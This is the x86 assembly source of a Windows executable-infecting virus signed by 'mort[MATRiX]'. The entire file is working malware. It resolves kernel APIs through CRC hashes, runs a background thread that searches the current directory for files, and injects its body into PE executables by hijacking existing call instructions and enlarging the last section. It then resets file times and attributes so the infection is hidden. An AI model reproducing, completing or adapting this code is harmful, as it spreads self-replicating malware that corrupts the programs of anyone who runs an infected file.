
_wait                         = 5000
_FSstrucSize                  = 320

_mutexFlag                    = 4
_mutexIN                      = _mutexFlag + 4
_searchPlace                  = _mutexIN + 16


.386
.model flat,stdcall


extrn               ExitProcess                   : proc
extrn               MessageBoxA                   : proc


.data
dd ?

.code
@ls:
          mov eax,@lsEnd - __xEntry

          call __xEntry

          call MessageBoxA,0,offset _mess,offset _title,0

          call ExitProcess,0


_title              db '.ls by mort[MATRiX]',0
_mess               db '.ty moje prdy priserne smrdi...',0


;---( x.call entry record )-------------------------------------------
__xEntry:
_h1                 label
          call @lsEntry
          ret
_oldB     db 5 dup(090h)
_h2                 label
_ht                           = _h2 - _h1

_vSize                        = @lsEnd - __xEntry
_vSize200h                    = ((_vSize / 0200h) + 1) * 0200h
_vSize1000h                   = ((_vSize / 01000h) + 1) * 01000h

_copySize                     = @lsEnd - @lsEntry
_vs200h  = ((_copySize/200h)+1)*200h+200h
_vs1000h = ((_copySize/1000h)+1)*1000h+1000h

_minSize                      = 01000h ;minimal size for infect

;---( entrypoint )----------------------------------------------------
@lsEntry:
          pusha                         ;get delta handle
          mov eax,[esp + 020h]
          push eax
          xchg eax,esi
          std
          lodsd
          lodsd
          pop ebx
          add eax,ebx
          add eax,@delta - @lsEntry

          jmp @__odatas

          db 'azor, ja sem azor!!!'
          
;---( APIs )----------------------------------------------------------

_APIadd             label
          _lstrcatA                     dd 0
          _GetCurrentDirectoryA         dd 0
          _SetFileTime                  dd 0
          _ExitThread                   dd 0
          _SetFilePointer               dd 0
          _SetEndOfFile                 dd 0
          _SetFileAttributes            dd 0
          _WaitForSingleObject          dd 0
          _ResumeThread                 dd 0
          _SetThreadPriority            dd 0
          _ReleaseMutex                 dd 0
          _Sleep                        dd 0
          _CreateThread                 dd 0
          _CreateFileA                  dd 0
          _CloseHandle                  dd 0
          _CreateMutexA                 dd 0
          _FinFirstFileA                dd 0
          _FinNextFileA                 dd 0
          _CreateFileMappingA           dd 0
          _MapViewOfFile                dd 0
          _UnmapViewOfFile              dd 0
          _GetFileAttributesA           dd 0
          _MoveFileExA                  dd 0

__gpS     label

@delta              label

_kernells           label               ;kernell's stuff
                    dd 077e80000h - 1   ;NT 5
                    dd 0bff70000h - 1   ;w9x
                    dd 077f00000h - 1   ;NT 4
                    dd -1

_SF1HNDL            dd 0
_lscbBase           dd ?
_nameLSCB           db 'lsf',0
_Tname              db 'IN',0,0
_Tadd               dd offset @IN - offset @delta

_mutexes            label
          _IN                 db 'uncle fucker...',0
_mutexLen           equ $ - _mutexes

_mask               db '*.*',0

_fileHandle         dd ?
_mapHandle          dd ?
_mapBase            dd ?

_callNum            = 5

_jLocBuffer         dd _callNum dup(?)
_jLocEnd            label

_newFileSize        dd ?

_dpSize   = $ - __gpS

_APIcrc32           label
          dd        0e53075a6h          ;lstrcatA
          dd        0c8857430h          ;GetCurrentDirectoryA
          dd        07dc56385h          ;SetFileTime
          dd        061aa9101h          ;ExitThread
          dd        07a1c9a11h          ;SetFilePointer
          dd        00e805cb9h          ;SetEndOfFile
          dd        035250cd5h          ;SetFileAttributes
          dd        04990a32dh          ;WaitForSingleObject
          dd        02073e442h          ;ResumeThread
          dd        0c2990d25h          ;SetThreadPriority
          dd        08e372467h          ;ReleaseMutex
          dd        0064c5365h          ;Sleep
          dd        04223d846h          ;CreateThread
          dd        023dda402h          ;CreateFileA
          dd        0492eb515h          ;CloseHandle
          dd        00b241144h          ;CreateMutexA
          dd        0a3c33e76h          ;FinFirstFileA
          dd        0754f4085h          ;FinNextFileA
          dd        04c54363ah          ;CreateFileMappingA
          dd        04b566845h          ;MapViewOfFile
          dd        02d250913h          ;UnmapViewOfFile
          dd        035250d95h          ;GetFileAttributesA
          dd        00eb08c03h          ;MoveFileExA

          dd ?

_APIcrcEnd          label

@__odatas:
          mov [eax + _deltaPatch1 - @delta],eax

          xchg eax,ebp                  ;delta handle in ebp

          xor eax,eax
          mov dword ptr [ebp + _SF1HNDL - @delta],eax

          db 0e9h   ;no reentrancy semaphore
_rsv      dd 0
_rs                 equ $

          mov dword ptr [ebp + _rsv - @delta],@returnHost - _rs
          
          cld
          lea esi,[ebp + offset _kernells - @delta]

@nextKernell:
          lodsd
          push esi            ;save kernell offsets location
          inc eax
          jz @bad                           

          push ebp            ;save delta handle
          
          call @kernellSEH
          
          mov esp,[esp + 08h]

@bad1:
          pop dword ptr fs:[0]
          pop eax
          pop ebp
          pop esi
          jmp @nextKernell

@bad:
          pop eax
          jmp @returnHost

_memSize            = 01000h
_APIlen             = (_APIcrcEnd - _APIcrc32) / 4 

@SFstrucStart                 label
max_path            = 260
 filetime           struc
         FT_dwLowDateTime        dd ?              
         FT_dwHighDateTime       dd ?              
filetime           ends              
fileSearch         struc             
         FileAttributes          dd ?              
         CreationTime            filetime ?        
         LastAccessTime          filetime ?        
         LastWriteTime           filetime ?        
         FileSizeHigh            dd ?              
         FileSizeLow             dd ?              
         Reserved0               dd ?              
         Reserved1               dd ?              
         FileName                db max_path dup(?)
         AlternateFileName       db 13 dup(?)     
                                 db 3 dup(?)      
fileSearch         ends              

_SFstrucSize        = $ - @SFstrucStart

;---( MapLSCB )------------------------------------------------------- 
@MapLSCB:
          lea eax,[ebp + _nameLSCB - @delta]
          push eax
          push 04000h
          push 0 4 0
          push -1 
          call [ebp + _CreateFileMappingA - @delta] 
          push 04000h 0 0 2 eax
          call [ebp + _MapViewOfFile - @delta]
          mov [ebp + _lscbBase - @delta],eax
          ret

;---( fill LSCB )-----------------------------------------------------
@fillLSCB:
          push edi                      ;save lscb address
          mov eax,'lscb'
          stosd                         ;'lscb'
          xor eax,eax
          stosd                         ;mutex flag
          lea esi,[ebp + _mutexes - @delta]       ;main mutex
          mov ecx,_mutexLen
          rep movsb
          pop edi             ;lscb address
          ret

;---( get API name CRC )----------------------------------------------
@APIcrc:
          push ecx ebx        ;esi - API name offset 
          xor eax,eax          
          xor ecx,ecx
          inc ecx

@nextChar:          
          xchg al,bl
          lodsb
          or al,al
          jz @fuck
          xor al,bl
          test eax,ecx
          jz @notI
          ror eax,cl
@notI:
          ror eax,4
          ror eax,cl
          shl ecx,1
          jmp @nextChar
                        
@fuck:
          xor al,bl
          pop ebx ecx
          ret

;---( kernell checking )----------------------------------------------
@kernellSEH:
          push dword ptr fs:[0]
          mov dword ptr fs:[0],esp
          mov ebx,eax
          xchg eax,esi     
          xor eax,eax
          lodsw
          not eax
          cmp eax,not 'ZM'          
          jnz @bad1
          mov eax,[esi + 03ah]
          add eax,ebx
          mov ecx,eax
          xchg eax,esi
          lodsd
          not eax
          cmp eax,not 'EP'
          jnz @bad1
          
          pop dword ptr fs:[0]
          pop eax ebp esi          ;ebx - kernel base

          mov eax,ebx

;---( get apis)-------------------------------------------------------
          ;eax - kernel base
          cld
          add eax,[eax + 03ch]
          add eax,078h
          xchg eax,esi
          lodsd
          add eax,ebx
          
          push dword ptr [eax + 024h]   ;address of ordinals
          push dword ptr [eax + 01ch]   ;address of functions
          push dword ptr [eax + 018h]   ;API count
          push dword ptr [eax + 018h]   ;API count

          mov esi,[eax + 020h]
          add esi,ebx

@nextAPI:
          dec dword ptr [esp]
          jz @APIdone
          lodsd
          push esi
          add eax,ebx
          xchg eax,esi

          call @APIcrc
          
          lea edi,[ebp + _APIcrc32 - @delta]
          mov ecx,_APIlen
          repne scasd
          or ecx,ecx
          pop esi
          jz @nextAPI
          
          pop ecx             ;count API address
          pop eax
          sub esp,8
          push esi
          sub eax,ecx
          dec eax
          shl eax,1
          add eax,[esp + 010h]          
          add eax,ebx
          xchg eax,esi
          xor eax,eax
          lodsw
          shl eax,2
          add eax,[esp + 0ch]
          pop esi

          push eax
          mov eax,[eax + ebx]
          add eax,ebx
          mov [edi - (_APIlen*4 + _dpSize)],eax   ;yep,...
          pop ecx
          xchg eax,edx
          mov eax,[esi]
          jmp @nextAPI

@APIdone:
          add esp,010h

;---------------------------------------------------------------------          

          call @MapLSCB       ;map LSCB file

          xchg eax,edi        ;check if allready exist
          mov eax,'lscb'
          cmp eax,[edi]
          jz @allreadyFill

          call @fillLSCB      ;if not -> we are the first -> fill it

          push 0100h
          lea eax,[ebp + _curDir - @delta]
          call [ebp + _GetCurrentDirectoryA - @delta]
          
@allreadyFill:
          lea eax,[ebp + _Tname - @delta]  ;create resident thread,...
          xchg eax,ebx
          mov eax,[ebp + _Tadd - @delta]
          add eax,ebp
          push ebx
          push 4 0
          push eax
          push 0 0
          call [ebp + _CreateThread - @delta]

          push eax
          push 16
          push eax
          call [ebp + _SetThreadPriority - @delta]
          call [ebp + _ResumeThread - @delta]

;---( return host )---------------------------------------------------   
@returnHost:
          cld
          mov eax,[esp + 024h]
          push eax
          mov esi,[esp + 024h]
          inc esi
          pop edi
          mov ecx,5
          sub edi,ecx
          rep movsb
          popa
          sub dword ptr [esp + 04h],5
          ret

;---( Search files thread )-------------------------------------------
@IN                 label
          mov ebp,012345678h
_deltaPatch1        equ $ - 4

          mov esi,[ebp + _lscbBase - @delta]      

@INwaitingLoop:                         ;wait for mutexflag
          lea eax,[esi + _mutexIN]
          push eax
          push 1 0
          call [ebp + _CreateMutexA - @delta]
          push eax
          push eax
          
          cmp ecx,0b7h        ;!!!!!!!!!?????????????????
          jnz @goOverWFSO

          push -1
          push eax
          call [ebp + _WaitForSingleObject - @delta]

@goOverWFSO:          
          mov eax,[esi + _mutexFlag]
          dec eax
          jnz @searchFiles

          push esi
          call @infect
          pop esi

          dec dword ptr [esi + _mutexFlag]

          jmp @gotIT

@searchFiles:
          call @SF

@gotIT:
          call [ebp + _ReleaseMutex - @delta]
          call [ebp + _CloseHandle - @delta]

          push _wait
          call [ebp + _Sleep - @delta]
          jmp @INwaitingLoop

;---( search files )--------------------------------------------------

@SF:
          mov eax,[ebp + _SF1HNDL - @delta]
          or eax,eax
          jnz @SFfindNext
          
          lea eax,[esi + _searchPlace]
          push eax
          lea eax,[ebp + _mask - @delta]
          push eax
          call [ebp + _FinFirstFileA - @delta]
          mov [ebp + _SF1HNDL - @delta],eax

          jmp @SFboth

@SFfindNext:          
          xchg eax,ebx
          lea eax,[esi + _searchPlace]
          push eax
          push ebx
          call [ebp + _FinNextFileA - @delta]

          or eax,eax
          jnz @SFboth

          push 0
          call [ebp + _ExitThread - @delta]

@SFboth:          
          inc dword ptr [esi + _mutexFlag]
          ret

;---( infect files )--------------------------------------------------
@infect:
          mov eax,[esi + _searchPlace + FileSizeLow]
          cmp eax,_minSize

          jb @infBad1

          mov [ebp + _newFileSize - @delta],eax

          lea eax,[ebp + _curDir - @delta]
          push eax

          xchg eax,ebx
          lea eax,[esi + _searchPlace + FileName]
          push eax
          push ebx
          call [ebp + _lstrcatA - @delta]
          
          call @openFile      ;map it,...

          push esi
          call @finalInfect

          pop esi             ;searchplace
          pop edi             ;filename          
          call @closeFile     ;unmap it,...

@infBad1:
          ret

;---( final infection of file )---------------------------------------
@add2IMPORT:
          mov eax,[esp + 4]
          shl eax,2
          neg eax
          mov [ebp + _jLocEnd - @delta - eax],edi                  
          add edi,9           ;add call relative and our jump
          ret

@finalInfect:
          mov edi,eax
          mov eax,'MZZM'
          cmp ax,word ptr [edi]
          jz @foundMZ
          shr eax,010h
          cmp ax,word ptr [edi]
          jnz @notMZ

@foundMZ:       
          cmp word ptr [edi + 038],not 'TM'
          jz @notMZ
          
          mov eax,[edi + 3ch]           ;get PE location
          add eax,edi
          
          xchg esi,eax
          lodsd
          not eax
          cmp eax,not 'EP'      ;check PE sign
          jnz @notMZ

          mov word ptr [edi + 038],not 'TM'       ;mark
          
          xchg eax,esi
          sub eax,4
          
          xchg eax,edi
          xchg eax,ebx
          
          mov eax,[edi + 034h]
          push eax
                    
          push edi                      ;save PE offset          
          mov eax,[edi + 080h]          ;import RVA          
          push eax
          
          mov eax,[edi + 074h]
          shl eax,3
          add eax,078h
          add eax,edi
          xchg eax,esi

          push esi            ;save CODE sec. table location
          
          movzx eax,word ptr [edi + 06h]
          dec eax
          imul eax,028h
          
          add eax,esi
          push eax
          
          mov edi,[esi + 014h]
          add edi,ebx                   ;CODE location
          mov ecx,[esi + 010h]          ;CODE sec. lenght
          
          push _callNum              ;how many calls will be replaced

@nextSearchE8:          
          dec ecx
          or ecx,ecx
          jz @searchDone

          mov al,0e8h
          scasb               ;search for TASM call xxxx
          jz @TASMstuff
          
          dec edi
          mov esi,edi
          mov ax,15ffh
          scasw
          jnz @nextSearchE8
                    
          lodsw
          lodsd
          sub eax,[esp + 014h]
          mov esi,[esp + 08h]
          sub eax,[esi + 0ch]
          add eax,[esi + 014h]
          add eax,ebx
          xchg esi,eax                    
          jmp @MTASMstuff
                              
@TASMstuff:
          mov esi,edi

          lodsd               ;search call relative
          add esi,eax

          pusha               ;save register state
          call @SEHprotect
          mov esp,[esp + 8]

          pop dword ptr fs:[0]          
          pop eax             ;clear stack
          popa                ;load register state
          jmp @nextSearchE8
          
@SEHprotect:
          push dword ptr fs:[0]
          mov dword ptr fs:[0],esp

          lodsw

          pop dword ptr fs:[0]          ;clear stack
          pop edx

          cmp ax,025ffh       ;check if import call
          popa                ;load actual pointer
          jnz @nextSearchE8

          lodsw
         
@MTASMstuff:
          lodsd
          sub eax,[esp + 014h]
          cmp eax,[esp + 0ch]
          jb @notInIMPORT

          push edi ecx        ;check if no call right in replacement
          add edi,4
          mov al,0e8h
          mov ecx,5
          repne scasb
          or ecx,ecx
          pop ecx edi
          jnz @notInIMPORT

          mov ax,025ffh       ;check if no import call in replacement
          mov esi,5
          mov edx,edi
          add edx,4
          
@nextDW:  
          push edi
          mov edi,edx          
          scasw
          mov edx,edi
          pop edi
          jz @nextSearchE8
                    
          dec edx
          dec esi          
          jnz @nextDW
                            
          call @add2IMPORT
          dec dword ptr [esp]

@notInIMPORT:
          jnz @nextSearchE8

;-----------------------------------------------------------------------
@searchDone:
          lea esi,[ebp + _jLocBuffer - @delta]    
          mov eax,_callNum
          sub eax,[esp]       ;set number of founded calls
          jz @fuckinWedr
          
          xchg eax,[esp]
          mov eax,[esp + 4]   ;last section table
          xchg eax,edi

          mov eax,[edi + 014h]
          add eax,[edi + 010h]          ;where our copy will start
          add eax,ebx          

          push eax
          xchg eax,edi        ;place to copy in edi
          
@nextReplacement:
          lodsd        
          xchg eax,esi
          xchg eax,ecx        ;save esi
          lodsd               ;our call place in esi
          
          cld
          mov edi,[esp]
          mov al,0e8h         ;set jump
          stosb
          mov eax,[esp + 4]   ;compute call relative
          imul eax,_ht
          sub eax,5
          
          stosd
          mov al,0c3h         ;set ret
          stosb

          movsd               ;copy old bytes
          movsb
          
          mov edi,[esp + 0ch]           ;compute call relative
          mov eax,esi
          sub eax,ebx
          sub eax,[edi + 014h]
          add eax,[edi + 0ch]
          xchg eax,edx
          mov edi,[esp + 08h]           ;continue compute call relative
          mov eax,[esp]
          sub eax,ebx
          sub eax,[edi + 014h]
          add eax,[edi + 0ch]
          sub eax,edx
          
          std                 ;finall contdown
          xchg esi,edi
          scasd
          scasb
          mov byte ptr [edi],0e8h
          inc edi
          cld
          stosd
          
          add dword ptr [esp],_ht       ;go to next replacement
          xchg esi,ecx                  ;load esi
          dec dword ptr [esp + 4]       ;dec replacement count
          jnz @nextReplacement

          mov edi,[esp]
          push edi
          lea esi,[ebp + @lsEntry - @delta]
          mov ecx,_copySize
          rep movsb
          pop edi

          xor eax,eax          
          mov dword ptr [edi + _rsv - @lsEntry],eax
          
          mov edi,[esp + 08h]
          add dword ptr [edi + 010h],_vs200h
          add dword ptr [edi + 08h],_vs1000h
          or dword ptr [edi + 024h],0a0000020h

          mov edi,[esp + 0ch]
          or dword ptr [edi + 024h],0a0000020h
                    
          add esp,014h
          pop edi
          add dword ptr [edi + 050h],_vs1000h
          add dword ptr [ebp + _newFileSize - @delta],_vs200h          
          pop eax
@notMZ:   
          ret

@fuckinWedr:
          add esp,018h
          ret

;---------------------------------------------------------------------
@openFile:          
          ;filename in eax
          ;searchplace in esi

          push eax
          push 020h
          push eax
          call [ebp + _SetFileAttributes - @delta]

          pop eax
          push 0 0 3 0 1
          push 80000000h or 40000000h
          push eax
          call [ebp + _CreateFileA - @delta]

          mov [ebp + _fileHandle - @delta],eax
          xchg eax,ebx
          mov eax,[esi + _searchPlace + FileSizeLow]
          add eax,_vSize200h + 01000h

          push eax            ;for mapviewoffile
          push 0
          push eax
          push 0 4 0
          push ebx
          call [ebp + _CreateFileMappingA - @delta]

          mov [ebp + _mapHandle - @delta],eax
          pop ebx   ;size to map
          push ebx
          push 0 0 2
          push eax
          call [ebp + _MapViewOfFile - @delta]
          mov [ebp + _mapBase - @delta],eax
          ret

;---------------------------------------------------------------------          
@closeFile:
          ;esi - searchplace
          ;edi - filename

          push dword ptr [ebp + _mapBase - @delta]
          call [ebp + _UnmapViewOfFile - @delta]

          push dword ptr [ebp + _mapHandle - @delta]
          call [ebp + _CloseHandle - @delta]

          mov eax,[ebp + _fileHandle - @delta]
          push eax            ;for setendoffile
          push eax            ;for setfiletime
          push eax            ;for closehandle
          push 0 0                                ;set new filesize
          push dword ptr [ebp + _newFileSize - @delta]
          push eax
          call [ebp + _SetFilePointer - @delta]

          call [ebp + _SetEndOfFile - @delta]

          pop ebx
          lea eax,[esi + _searchPlace + LastWriteTime]
          push eax
          sub eax,8
          push eax
          sub eax,8
          push eax
          push ebx
          call [ebp + _SetFileTime - @delta]

          call [ebp + _CloseHandle - @delta]
          
          mov eax,[esi + _searchPlace + FileAttributes]
          push eax
          push edi
          call [ebp + _SetFileAttributes - @delta]          
          ret
          _curDir             db 0100h dup(0)
@lsEnd              label
end @ls
